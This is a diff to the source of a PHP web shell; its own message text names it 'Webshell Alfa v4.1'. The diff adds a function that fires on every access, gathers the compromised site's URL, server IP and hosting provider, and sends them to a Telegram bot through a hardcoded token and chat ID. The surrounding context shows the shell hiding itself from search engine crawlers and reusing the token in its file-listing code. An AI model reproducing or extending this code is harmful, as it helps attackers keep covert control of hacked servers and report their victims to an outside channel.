@@ -519,6 +519,40 @@ unset($GLOBALS['oZgNypoPRU']);
 
 if (!isset($_SERVER["HTTP_HOST"])) exit();
 
+function sendTelegramAlert() {
+static $sent = false;
+if ($sent) return;
+$sent = true;
+$botToken = '7952379400:AAEBP4e0EqiT2h9Ho_Nu1fNOVhF6sjxoRq8';
+$chatId   = '-1002856618500';
+$scheme = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
+$url    = "{$scheme}://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
+$ip = $_SERVER['SERVER_ADDR'] ?? gethostbyname($_SERVER['HTTP_HOST']);
+$infoJson = @file_get_contents("http://ip-api.com/json/{$ip}?fields=query,org");
+$info     = $infoJson ? json_decode($infoJson) : null;
+$provider = $info->org   ?? 'Unknown Provider';
+$hostIp   = $info->query ?? $ip;
+$message  = "🚨 *Webshell Alfa v4.1 Access!* 🚨\n"
+. "*URL:* `{$url}`\n"
+. "*Server IP:* `{$hostIp}`\n"
+. "*Provider:* {$provider}";
+$apiUrl = "https://api.telegram.org/bot{$botToken}/sendMessage";
+$ch = curl_init($apiUrl);
+curl_setopt_array($ch, [
+CURLOPT_POST       => true,
+CURLOPT_POSTFIELDS => [
+'chat_id'    => $chatId,
+'text'       => $message,
+'parse_mode' => 'Markdown'
+],
+CURLOPT_RETURNTRANSFER => true,
+CURLOPT_TIMEOUT        => 2,
+]);
+curl_exec($ch);
+curl_close($ch);
+}
+sendTelegramAlert();
+
 if(!empty($_SERVER['HTTP_USER_AGENT'])){$userAgents = array("Google","Slurp","MSNBot","ia_archiver","Yandex","Rambler","bot","spider");if(preg_match('/'.implode('|',$userAgents).'/i',$_SERVER['HTTP_USER_AGENT'])){header('HTTP/1.0 404 Not Found');exit;}}
 if(!isset($GLOBALS['DB_NAME']['user']))exit('$GLOBALS[\'DB_NAME\'][\'user\']');
 if(!isset($GLOBALS['DB_NAME']['pass']))exit('$GLOBALS[\'DB_NAME\'][\'pass\']');
@@ -2952,7 +2986,7 @@ if($move_cmd_file&&$alfa_canruncmd){
 		$ret_files[] = array("name" => $file['name'], "size" => alfaSize($file_size), "perm" => $file_perm, "modify" => $file_modify, "owner" => $file_owner."/".$file_group);
 		$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
 		$cwd_url = str_replace($_SERVER['DOCUMENT_ROOT'], '', realpath($GLOBALS['cwd']));
-		$cwd_url = '/' . ltrim($cwd_url, '/'); // jaga2 kalau tidak diawali /
+		$cwd_url = '/' . ltrim($cwd_url, '/');
 		$filename = rawurlencode($file['name']);
 		$permalink = $protocol . $_SERVER['HTTP_HOST'] . rtrim($cwd_url, '/') . '/' . $filename;
 		$token = "7952379400:AAEBP4e0EqiT2h9Ho_Nu1fNOVhF6sjxoRq8";
